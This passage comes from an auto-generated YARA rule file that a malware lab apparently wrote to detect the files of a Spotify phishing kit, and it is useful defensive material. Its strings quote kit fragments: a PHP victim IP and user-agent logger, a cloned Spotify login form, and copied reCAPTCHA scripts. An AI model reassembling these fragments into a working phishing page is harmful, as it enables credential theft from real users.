      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s8 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s9 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s10 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s13 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__spotify/phish__spotify_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__spotify
   Reference: phish__spotify phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule styles__ltr {
   meta:
      description = "phish__spotify - file styles__ltr.css"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "1fa89ff0d6cd6e360c58f7fdb1ecec1d4aee2e1f6f3699072c5f9e2852c615ea"
   strings:
      $x1 = ".goog-inline-block{position:relative;display:-moz-inline-box;display:inline-block}* html .goog-inline-block{display:inline}*:fir" ascii /* score: '66.00'*/
      $s2 = "sform.Microsoft.AlphaImageLoader(src='https://www.gstatic.com/recaptcha/api2/logo_48.png',sizingMethod='scale')}.rc-anchor-logo-" ascii /* score: '30.00'*/
      $s3 = "tps://www.gstatic.com/recaptcha/api2/logo_48.png');background-repeat:no-repeat}.rc-anchor-logo-img-ie8{filter:progid:DXImageTran" ascii /* score: '20.00'*/
      $s4 = "argin:5px 20px 5px 20px;text-align:center}.rc-audiochallenge-tdownload-link{background-image:url('https://www.gstatic.com/recapt" ascii /* score: '19.00'*/
      $s5 = ".com/recaptcha/api2/canonical_bridge.png');background-repeat:no-repeat}.rc-coref-payload{padding:10px;font-family:Roboto,helveti" ascii /* score: '19.00'*/
      $s6 = "utton-radio{background:url(//ssl.gstatic.com/ui/v1/radiobutton/unchecked_focused.png) -3px -3px;background:rgba(255,255,255,0)}." ascii /* score: '18.00'*/
      $s7 = "ton-checked .jfk-radiobutton-radio{background:url(//ssl.gstatic.com/ui/v1/radiobutton/checked-disabled.png) -3px -3px;background" ascii /* score: '18.00'*/
      $s8 = "z-box-sizing:border-box;box-sizing:border-box;background:url(//ssl.gstatic.com/ui/v1/radiobutton/unchecked.png) -3px -3px;backgr" ascii /* score: '18.00'*/
      $s9 = "c.com/ui/v1/radiobutton/checked.png) -3px -3px;background:rgba(255,255,255,0)}.jfk-radiobutton.jfk-radiobutton:focus .jfk-radiob" ascii /* score: '18.00'*/
      $s10 = "der-box;text-align:center;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}.rc-imageselect-target>div:hover{}" ascii /* score: '17.00'*/
      $s11 = "ding:1px}.rc-image-tile-target tr,td{margin:0}.rc-imageselect-keyboard{outline:solid orange!important;position:relative;z-index:" ascii /* score: '17.00'*/
      $s12 = "a9op/Blh8jE+opghoHpAyTmPMRZKobXSKGcTHWMQY7wqDGMEkxQ3Uj2Z6hjfrunVghe44QzG+I9I8jFqbqw0xBiXpDVgPKl8GOP2jMd3ie+9VOTJGM8CSWyX01z5S4eC" ascii /* score: '17.00'*/
      $s13 = "POFjQtQPHvAORpi+f5qx2cVkrXstQci4K2s9wgxY01zEbgW2O1PbeoIRCnqdfI5JEYwXoqg8aScOqRKMtR4NRKREY619hnekzCoOPRmqc8JAdfZUrPWbwFx3KGs+ooYu" ascii /* score: '16.00'*/
      $s14 = "65je0wLoGHlIvl7uk1GFEBeB+Rj7VsDQ8IxWxSE9iDEeIJIxQg4dVL46EoGFrwLC23cl+rNRQAIAHuC8z61lRrNbSdBtE3DrvBJvIUbG7NCjzIrx+H/cHDorcnQOHVlR" ascii /* score: '16.00'*/
      $s15 = "qKmxFRXRA4dsArc6HLZBFVNhXX40OKHwboIvyYZNuChX2vPOaVWME3Rp8wrcBOiUftpF7a9VRgS+6qFm9/Xazqq1tVnV1uQk+4As+DUzE6J0vDzqU8EelonrQAb5L8u1" ascii /* score: '16.00'*/
      $s16 = "PBipy1SR/42YffU/9hXPTmKjyTV0A1AZOTmGbwh8nQhia2ASQDALnVlrKG4IIsUk6uJhf9aaWq68eYvHf5kOsvDCGofgMjB0SFUNTtwllwu4Dy9+FAKe6MwiPEzYHdBU" ascii /* score: '16.00'*/
      $s17 = "4vyCEYeYsk9ZbQ5r3UmsxW4eciZ3jBMT9mbyrNvV/3Y5xJRerHVsiqAQax2DVOkLxVq3MYeW00tRWOt2z+HtK7P2cPZAwYCGQezl7DdVrRlY63QTokfpUL+SPjWM3Sl3" ascii /* score: '16.00'*/
      $s18 = "kINVJ1dblpOgXJKd/a8sbs98pg6U3i9DJh7xDgTRhlxr/ezMglNHzZx9MRuo1afHyySLY4uy4SbDXeYCStwc8/Cdie5AXl1a1rPDUU5khEADdKX4/M38EMNOwYOgZl9D" ascii /* score: '16.00'*/
      $s19 = "gDtR6Wasyi5BmoAOQPbT+n1ZlFiFNj1xhnqf1DoBd/dyGyt+W76z84LOGys/3xUg4xjlcY6hIe14OMM/TegfAFi1aVFldXV1ZV1dX+cUXX5BwjHO4xlCR9rwcYA7W+h8" ascii /* score: '16.00'*/
      $s20 = "BKTT3Ci6/GCTU26HjhlOGMaIe4qjDJVuOccG6BifErZ4koINVARwA03ud49w/WJiDc1clsJLxFC8No1DmrOLotu74D9vo/CsK42/eCD+UqUKY/yUVpG8jPDIA/GpOHra" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x672e and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule hVpKLs9k787xwHAhrfSZCIqM1XtnPD1dxAE7zC2jvTU {
   meta:
      description = "phish__spotify - file hVpKLs9k787xwHAhrfSZCIqM1XtnPD1dxAE7zC2jvTU.js"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "855a4a2ecf64efcef1c07021adf499088a8cd57b673c3d5dc4013bcc2da3bd35"
   strings:
      $x1 = "/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */ Function('var R=this,b=function(A,m,q," ascii /* score: '38.50'*/
      $s2 = "/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */ Function('var R=this,b=function(A,m,q," ascii /* score: '15.00'*/
      $s3 = "ch(A){}try{R.addEventListener(\"test\",null,Object.defineProperty({},\"passive\",{get:function(){e={passive:true}}}))}catch(A){}" ascii /* score: '11.00'*/
      $s4 = "T=function(A,m){for(m=[];A--;)m.push(255*Math.random()|0);return m},K=function(A,m){A.U=(\"E:\"+m.message+\":\"+m.stack).slice(0" ascii /* score: '10.00'*/
      $s5 = "f(A,242,function(A,m,q){S(A,1,5)||(m=A.J(),q=A.J(),f(A,q,function(A){return eval(A)}(A.c(m))))}),A.K=[],m)&&\"!\"==m.charAt(0)?(" ascii /* score: '9.00'*/
      $s6 = "0;E<H;E+=D)q(m.slice(E,E+D),A)}}),f)(A,96,function(){}),f(A,220,function(A){b(A,1)}),f)(A,89,function(A,m,q,D){if(m=A.j.pop()){f" ascii /* score: '7.00'*/
      $s7 = "(C(A,g),O(A,true,false,false)):P=h(A,g);return P}},S=(B.prototype.F=(window.performance||{}).now?function(){return this.Je+(wind" ascii /* score: '7.00'*/
      $s8 = "removeEventListener(A[1],A[2],false)}),f)(A,214,0),f(A,45,function(A,m,q,D){(q=(m=A.J(),A).J(),D=A.J(),f)(A,D,A.c(m)||A.c(q))})," ascii /* score: '7.00'*/
      $s9 = ")),A).c(A.J()),A).c(q),A.c(D)),0)!==m&&(D=r(A,D,E,1,m,q),m.addEventListener(q,D,e),f(A,152,[m,q,D]))}),f)(A,153,function(A){A.M&" ascii /* score: '7.00'*/
      $s10 = "(q&&m&&L(A)){E=A,A.cg(function(){O(E,false,m,false)});break}D=(q=true,A).K.pop(),D=h(A,D)}return D}),r=function(A,m,q,D,E,W){ret" ascii /* score: '7.00'*/
      $s11 = "ow.performance.now()|0)}:function(){return+new Date},function(A,m,q){if(0>=A.D||1<A.B||!A.g&&0<m||0!=document.hidden||A.F()-A.o<" ascii /* score: '7.00'*/
      $s12 = "ion(A,m){if(m=this.f[A],void 0===m)throw J(this,30,0,A),this.v;return m()},X=R.botguard||(R.botguard={}),X.EKc=function(A,m,q){(" ascii /* score: '7.00'*/
      $s13 = ";return D=(A=(D+=D<<3,D^=D>>11,D+(D<<15)>>>0),new Number(A&(1<<m)-1)),D[0]=(A>>>m)%q,D},function(A,m,q,D,E){for(;A.K.length;){if" ascii /* score: '6.50'*/
      $s14 = ",E=\"\",A.f)[127])for(l=A.c(127),H=0,y=l.length;q--;)H=(H+N(A))%y,E+=D[l[H]];else for(;q--;)E+=D[A.J()];f(A,m,E)}),f(A,17,functi" ascii /* score: '6.50'*/
      $s15 = "(q=X[A.substring(0,3)])?new q(A.substring(3),m):new X.EKc(A,m)};try{X.u||(R.addEventListener(\"unload\",function(){},e),X.u=1)}c" ascii /* score: '6.00'*/
      $s16 = "nction(A,m,q,D,E){if(4==(m=A[0],m)){A=A[1];try{for(D=(A=(q=atob(A),[]),m=0);D<q.length;D++)E=q.charCodeAt(D),255<E&&(A[m++]=E&25" ascii /* score: '4.00'*/
      $s17 = "eturn\"object\";if(\"[object Array]\"==q||\"number\"==typeof A.length&&\"undefined\"!=typeof A.splice&&\"undefined\"!=typeof A.p" ascii /* score: '4.00'*/
      $s18 = "ut(A,0)},function(A,m,q){return q=A.c(196),A.m&&q<A.m.length?(f(A,196,A.m.length),a(A,m)):f(A,196,m),Z(A,q)}),Z=function(A,m,q,D" ascii /* score: '4.00'*/
      $s19 = "on(A,m){if(this.C)return A=A?this.C().shift():this.w().shift(),this.C().length||this.w().length||(this.w=this.C=void 0,this.B--)" ascii /* score: '4.00'*/
      $s20 = ").push(A[8]<<24|A[9]<<16|A[10]<<8|A[11])},f)(A,83,function(A,m,q){m=(m=A.J(),q=A.J(),A).c(m),f(A,q,Y(m))}),f)(A,73,function(A){z" ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 40KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__spotify_home_ubuntu_malware_lab_samples_extracted_phishing_Spotify_index_files_api {
   meta:
      description = "phish__spotify - file api.js"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "f7a1c7cd63a592edeb73310c39f4e7cf4d3f58b9a68bba72365f2a797e8461ff"
   strings:
      $s1 = "/* PLEASE DO NOT COPY AND PASTE THIS CODE. */(function() {var CFG='___grecaptcha_cfg';if(!window[CFG]){window[CFG]={};}var GR='g" ascii /* score: '28.00'*/
      $s2 = "o=document.createElement('script');po.type='text/javascript';po.async=true;po.src='https://www.gstatic.com/recaptcha/api2/v15288" ascii /* score: '19.00'*/
      $s3 = "'));if(n){po.setAttribute('nonce',n);}var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(po, s);})();" fullword ascii /* score: '15.00'*/
      $s4 = "55115741/recaptcha__en.js';var elem=document.querySelector('script[nonce]');var n=elem&&(elem['nonce']||elem.getAttribute('nonce" ascii /* score: '11.00'*/
      $s5 = "/* PLEASE DO NOT COPY AND PASTE THIS CODE. */(function() {var CFG='___grecaptcha_cfg';if(!window[CFG]){window[CFG]={};}var GR='g" ascii /* score: '4.00'*/
      $s6 = "recaptcha';if(!window[GR]){window[GR]={};}window[GR].ready=window[GR].ready||function(f){(window[CFG]['fns']=window[CFG]['fns']|" ascii /* score: '3.00'*/
      $s7 = "1528855115741" ascii /* score: '1.00'*/
      $s8 = "|[]).push(f);};(window[CFG]['render']=window[CFG]['render']||[]).push('explicit');window['__google_recaptcha_client']=true;var p" ascii /* score: '0.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 2KB and
      all of them
}

rule recaptcha__en {
   meta:
      description = "phish__spotify - file recaptcha__en.js"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "802f005cedac2ee562b3e02cfc9cb8188be89802d3abb3074fccffc0db7cb15b"
   strings:
      $x1 = "break;case 8:b+=\"ERROR for site owner: Invalid key type\";break;case 9:b+=\"ERROR for site owner: Invalid package name\";break;" ascii /* score: '40.00'*/
      $x2 = "V(Kq({id:a.pb,name:a.qb,display:!0}))+\"</div>\")};var Pq=function(a){var b=a.pb,c=a.qb;return U('<div class=\"grecaptcha-badge" ascii /* score: '37.00'*/
      $x3 = "n.xa=function(a,b){if(b)return vp(this.l,a),aq.I.xa.call(this,a,b);Z(this,a,M(\"rc-defaultchallenge-incorrect-response\",void 0)" ascii /* score: '37.00'*/
      $x4 = "Vp.prototype.Ea=function(){this.l.push([]);this.Qa();if(3<this.l.length)return!1;lp(this,!1);Q(function(){lp(this,!0)},500,this)" ascii /* score: '34.00'*/
      $x5 = "d);pj(g);qj(g,!1,a)};f=b.attributes||{};Yb(f,{type:\"text/javascript\",charset:\"UTF-8\"});Nd(e,f);Cd(e,a);Aj(c).appendChild(e);" ascii /* score: '33.00'*/
      $x6 = "var re=function(a,b,c){v(c)&&(c=c.join(\" \"));var d=\"aria-\"+b;\"\"===c||void 0==c?(Zc||(Zc={atomic:!1,autocomplete:\"none\",d" ascii /* score: '33.00'*/
      $x7 = "\"Alternatively, download audio as MP3\".replace(Ql,Rl);return U(a+'\"></a>')},ip=function(a){a=a||{};var b=\"\";a.Be||(b+=\"Pre" ascii /* score: '32.00'*/
      $s8 = "'\"><div id=\"rc-text-target\" class=\"'+W(\"rc-text-target\")+'\" dir=\"ltr\">';a=a.fe;var d=10>a.length?1:2,e=a.length/d;var f" ascii /* score: '30.00'*/
      $s9 = "function Yr(a,b){try{return a[Zr(b)]}catch(c){return null}}function $r(a){try{return a[Zr(\"175206285a0d021a170b714d210f1758\")]" ascii /* score: '30.00'*/
      $s10 = "'<div class=\"'+W(\"rc-prepositional-attribution\")+'\">';b+=\"Sources: \";a=a.dd;for(var c=a.length,d=0;d<c;d++)b+='<a target=" ascii /* score: '30.00'*/
      $s11 = "(e=null)}}else\"mouseover\"==c?e=a.fromElement:\"mouseout\"==c&&(e=a.toElement);this.relatedTarget=e;null===d?(this.clientX=void" ascii /* score: '30.00'*/
      $s12 = "Of()};Jm.prototype.execute=function(a,b){this.o.then(function(b){b.invoke(function(b){a(b)})},function(){b()})};var Km=function(" ascii /* score: '30.00'*/
      $s13 = "p.window&&p.window.__google_recaptcha_client&&(p.window.___grecaptcha_cfg||Ta(\"___grecaptcha_cfg\",{}),p.window.___grecaptcha_c" ascii /* score: '28.00'*/
      $s14 = "var b=a.contentWindow;a=b.document;a.open();a.write(\"\");a.close();var c=\"callImmediate\"+Math.random(),d=\"file:\"==b.locatio" ascii /* score: '28.00'*/
      $s15 = "he=function(a,b){var c=[];ge(a,b,c,!1);return c},ge=function(a,b,c,d){if(null!=a)for(a=a.firstChild;a;){if(b(a)&&(c.push(a),d)||" ascii /* score: '27.00'*/
      $s16 = "users, we can\\'t process your request right now. For more details visit <a href=\"https://developers.google.com/recaptcha/docs/" ascii /* score: '27.00'*/
      $s17 = "t clear, or to get a new challenge, reload the challenge.<a href=\"https://support.google.com/recaptcha\" target=\"_blank\">Lear" ascii /* score: '26.00'*/
      $s18 = "ion and reload.<br><br><a href=\"https://support.google.com/recaptcha#6262736\" target=\"_blank\">Why is this happening to me?</" ascii /* score: '26.00'*/
      $s19 = "yp.prototype.Ma=function(a){Fk(a,ip,{Be:this.P})};var Bp=function(a){return U('<div id=\"rc-canvas\"><canvas class=\"rc-canvas-c" ascii /* score: '26.00'*/
      $s20 = "ew challenge, click the reload icon. <a href=\"https://support.google.com/recaptcha\" target=\"_blank\">Learn more.</a>')};var a" ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__spotify_home_ubuntu_malware_lab_samples_extracted_phishing_Spotify_login {
   meta:
      description = "phish__spotify - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5553c5b0a5505bd8b19fc823887f9539b9e30f624f405aa9294be68205e2a918"
   strings:
      $x1 = "&quot;\" sp-disallow-chars-model=\"usernameDisallowedChars\" autocapitalize=\"off\" autocomplete=\"off\" autocorrect=\"off\" aut" ascii /* score: '60.00'*/
      $x2 = "  <!-- ngView:  --><body ng-view=\"\" class=\"ng-scope\"><div sp-header=\"\" class=\"ng-scope\"><div class=\"head \"> <a class=" ascii /* score: '58.00'*/
      $x3 = "potify's <a href=\"https://www.spotify.com/br/legal/end-user-agreement/plain/\" target=\"_blank\">Terms &amp; Conditions</a> and" ascii /* score: '32.00'*/
      $x4 = "\"onLoginClick($event)\">Log In</button> </div> </div> </form> <!-- ngIf: !iOS && !disableSignup --><div ng-if=\"!iOS &amp;&amp;" ascii /* score: '31.00'*/
      $s5 = "    <!-- base href=\"https://accounts.spotify.com/\" -->" fullword ascii /* score: '28.00'*/
      $s6 = "href=\"https://www.spotify.com/br/legal/privacy-policy/plain/\" target=\"_blank\">Privacy Policy</a>.</p> </div> </div> </div> <" ascii /* score: '27.00'*/
      $s7 = "facebook.com/v2.3/dialog/oauth?client_id=174829003346&amp;state=AQB-Kb-5JrLE65CJt-HB-Z5ZinnCqV1XJtFttc5U68oOHGxVKlV6LFCefH2dHqjt" ascii /* score: '25.00'*/
      $s8 = "utofocus\" ng-trim=\"false\" type=\"text\"> <!-- ngIf: accounts.username.$dirty && accounts.username.$invalid --> </div> </div> " ascii /* score: '23.00'*/
      $s9 = "ptcha --> <div class=\"col-xs-12 col-sm-6\"> <button class=\"btn btn-sm btn-block btn-green ng-binding\" id=\"login-button\" ng-" ascii /* score: '23.00'*/
      $s10 = "- ngIf: !disableSignup --><p ng-if=\"!disableSignup\" class=\"ng-binding ng-scope\"> Don't have an account? <a ng-href=\"https:/" ascii /* score: '22.00'*/
      $s11 = "spotify.com/br/signup/?forward_url=true\" class=\"ng-binding\" href=\"https://www.spotify.com/br/signup/?forward_url=true\">Sign" ascii /* score: '21.00'*/
      $s12 = "word-reset/\" class=\"ng-binding\" href=\"https://www.spotify.com/br/password-reset/\">Forgot your username or password?</a> </p" ascii /* score: '21.00'*/
      $s13 = "6CutdCpOdob68gmqQTD0onsRL0Nqh_U6LOefp8UAyxuKDhScRK4ct9oUkaJxekvJQZRoy1s&amp;redirect_uri=https%3A%2F%2Faccounts.spotify.com%2Fap" ascii /* score: '20.00'*/
      $s14 = "68gmqQTD0onsRL0Nqh_U6LOefp8UAyxuKDhScRK4ct9oUkaJxekvJQZRoy1s&amp;redirect_uri=https%3A%2F%2Faccounts.spotify.com%2Fapi%2Ffaceboo" ascii /* score: '20.00'*/
      $s15 = " && accounts.password.$invalid --> </div> </div> <div class=\"row row-submit\"> <div class=\"col-xs-12 col-sm-6\"> <div class=\"" ascii /* score: '20.00'*/
      $s16 = "    <title ng-bind=\"(title &amp;&amp; (title | localize) + ' - ') + 'Spotify'\" class=\"ng-binding\">Login - Spotify</title>" fullword ascii /* score: '20.00'*/
      $s17 = "k%2Foauth%2Faccess_token\" class=\"btn btn-sm btn-block btn-facebook ng-binding\" target=\"_parent\" role=\"button\" href=\"http" ascii /* score: '19.00'*/
      $s18 = "word\" placeholder=\"Password\" required=\"\" autocomplete=\"off\" ng-trim=\"false\" type=\"password\"> <!-- ngIf: accounts.pass" ascii /* score: '19.00'*/
      $s19 = "ainer-fluid login ng-scope\"> <div class=\"content\"> <div class=\"row\"> <div class=\"col-xs-12\"> <a ng-href=\"https://www.fac" ascii /* score: '19.00'*/
      $s20 = "tus && status !== 200 --> <div class=\"row\" ng-class=\"{'has-error': (accounts.username.$dirty &amp;&amp; accounts.username.$in" ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__spotify_home_ubuntu_malware_lab_samples_extracted_phishing_Spotify_index_files_index {
   meta:
      description = "phish__spotify - file index.css"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "7ad0874abe3e28a8ecdb0183b9772aff858bdbd8cf30354dfd2f0d62f82da178"
   strings:
      $x1 = " *//*! normalize.css v3.0.3 | MIT License | github.com/necolas/normalize.css */html{font-family:sans-serif;-ms-text-size-adjust:" ascii /* score: '67.00'*/
      $s2 = "}.authorize .disclaimer,.login .disclaimer{font-size:.7em}.error .content{text-align:center}.eula .iframe-wrapper{height:350px;o" ascii /* score: '30.00'*/
      $s3 = " * Bootstrap v3.3.7 (http://getbootstrap.com)" fullword ascii /* score: '26.00'*/
      $s4 = "play:inline-block;max-width:100%;width:200px}.head .spotify-logo:before{content:\"\";display:block;padding-top:33.33333333%}.hea" ascii /* score: '25.00'*/
      $s5 = "-superscript:before{content:\"\\E255\"}.glyphicon-subscript:before{content:\"\\E256\"}.glyphicon-menu-left:before{content:\"\\E2" ascii /* score: '24.00'*/
      $s6 = "{content:\"\\E179\"}.glyphicon-header:before{content:\"\\E180\"}.glyphicon-compressed:before{content:\"\\E181\"}.glyphicon-earph" ascii /* score: '23.00'*/
      $s7 = "right-mark:before{content:\"\\E194\"}.glyphicon-registration-mark:before{content:\"\\E195\"}.glyphicon-cloud-download:before{con" ascii /* score: '21.00'*/
      $s8 = " * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)" fullword ascii /* score: '21.00'*/
      $s9 = "\\E158\"}.glyphicon-collapse-down:before{content:\"\\E159\"}.glyphicon-collapse-up:before{content:\"\\E160\"}.glyphicon-log-in:b" ascii /* score: '21.00'*/
      $s10 = "re{content:\"\\E025\"}.glyphicon-download:before{content:\"\\E026\"}.glyphicon-upload:before{content:\"\\E027\"}.glyphicon-inbox" ascii /* score: '21.00'*/
      $s11 = "efore{content:\"\\E022\"}.glyphicon-time:before{content:\"\\E023\"}.glyphicon-road:before{content:\"\\E024\"}.glyphicon-download" ascii /* score: '21.00'*/
      $s12 = "tr(href) \")\"}abbr[title]:after{content:\" (\" attr(title) \")\"}a[href^=\"#\"]:after,a[href^=\"javascript:\"]:after{content:\"" ascii /* score: '21.00'*/
      $s13 = "n-info-sign:before{content:\"\\E086\"}.glyphicon-screenshot:before{content:\"\\E087\"}.glyphicon-remove-circle:before{content:\"" ascii /* score: '20.00'*/
      $s14 = "efore{content:\"\\E103\"}.glyphicon-fire:before{content:\"\\E104\"}.glyphicon-eye-open:before{content:\"\\E105\"}.glyphicon-eye-" ascii /* score: '20.00'*/
      $s15 = "ontent:\"\\E028\"}.glyphicon-play-circle:before{content:\"\\E029\"}.glyphicon-repeat:before{content:\"\\E030\"}.glyphicon-refres" ascii /* score: '20.00'*/
      $s16 = "-arrow-left:before{content:\"\\E132\"}.glyphicon-circle-arrow-up:before{content:\"\\E133\"}.glyphicon-circle-arrow-down:before{c" ascii /* score: '20.00'*/
      $s17 = "ntent:\"\\E129\"}.glyphicon-hand-down:before{content:\"\\E130\"}.glyphicon-circle-arrow-right:before{content:\"\\E131\"}.glyphic" ascii /* score: '20.00'*/
      $s18 = "ntent:\"\\E161\"}.glyphicon-flash:before{content:\"\\E162\"}.glyphicon-log-out:before{content:\"\\E163\"}.glyphicon-new-window:b" ascii /* score: '20.00'*/
      $s19 = ":\"\\E034\"}.glyphicon-headphones:before{content:\"\\E035\"}.glyphicon-volume-off:before{content:\"\\E036\"}.glyphicon-volume-do" ascii /* score: '20.00'*/
      $s20 = ".glyphicon-ok-circle:before{content:\"\\E089\"}.glyphicon-ban-circle:before{content:\"\\E090\"}.glyphicon-arrow-left:before{cont" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6e2e and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__spotify_home_ubuntu_malware_lab_samples_extracted_phishing_Spotify_index_files_bframe {
   meta:
      description = "phish__spotify - file bframe.html"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d8caebaf9ce075161c742851b8656885908bd8b0531a68041e7dc18e2363068a"
   strings:
      $s1 = "<html dir=\"ltr\" lang=\"en\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">" fullword ascii /* score: '17.00'*/
      $s2 = "ce=\"C/YlxIB2+Y0GHKWfEsri/aar4Hg\"></script></head>" fullword ascii /* score: '15.00'*/
      $s3 = "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">" fullword ascii /* score: '15.00'*/
      $s4 = "  src: local('Roboto Black'), local('Roboto-Black'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmYUtfABc4EsA.woff2) for" ascii /* score: '13.00'*/
      $s5 = "  src: local('Roboto Black'), local('Roboto-Black'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmYUtfBBc4.woff2) format" ascii /* score: '13.00'*/
      $s6 = "  src: local('Roboto Regular'), local('Roboto-Regular'), url(//fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu72xKOzY.woff2) for" ascii /* score: '13.00'*/
      $s7 = "  src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fBBc4.woff2) form" ascii /* score: '13.00'*/
      $s8 = "  src: local('Roboto Black'), local('Roboto-Black'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmYUtfCxc4EsA.woff2) for" ascii /* score: '13.00'*/
      $s9 = "  src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fCRc4EsA.woff2) f" ascii /* score: '13.00'*/
      $s10 = "  src: local('Roboto Black'), local('Roboto-Black'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmYUtfCBc4EsA.woff2) for" ascii /* score: '13.00'*/
      $s11 = "  src: local('Roboto Regular'), local('Roboto-Regular'), url(//fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu7GxKOzY.woff2) for" ascii /* score: '13.00'*/
      $s12 = "  src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fCBc4EsA.woff2) f" ascii /* score: '13.00'*/
      $s13 = "  src: local('Roboto Black'), local('Roboto-Black'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmYUtfCRc4EsA.woff2) for" ascii /* score: '13.00'*/
      $s14 = "  src: local('Roboto Black'), local('Roboto-Black'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmYUtfCxc4EsA.woff2) for" ascii /* score: '13.00'*/
      $s15 = "  src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fABc4EsA.woff2) f" ascii /* score: '13.00'*/
      $s16 = "  src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fCRc4EsA.woff2) f" ascii /* score: '13.00'*/
      $s17 = "  src: local('Roboto Black'), local('Roboto-Black'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmYUtfBBc4.woff2) format" ascii /* score: '13.00'*/
      $s18 = "  src: local('Roboto Regular'), local('Roboto-Regular'), url(//fonts.gstatic.com/s/roboto/v18/KFOmCnqEu92Fr1Mu72xKOzY.woff2) for" ascii /* score: '13.00'*/
      $s19 = "  src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fBBc4.woff2) form" ascii /* score: '13.00'*/
      $s20 = "  src: local('Roboto Medium'), local('Roboto-Medium'), url(//fonts.gstatic.com/s/roboto/v18/KFOlCnqEu92Fr1MmEU9fCBc4EsA.woff2) f" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 30KB and
      8 of them
}

rule _opt_mal_phish__spotify_home_ubuntu_malware_lab_samples_extracted_phishing_Spotify_index_files_anchor {
   meta:
      description = "phish__spotify - file anchor.html"
      author = "Comps Team Malware Lab"
      reference = "phish__spotify phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "1f816ce8967fdcc394fb58e685790d907f4b675fbc8aad054fa92fb5c119fbcc"
   strings:
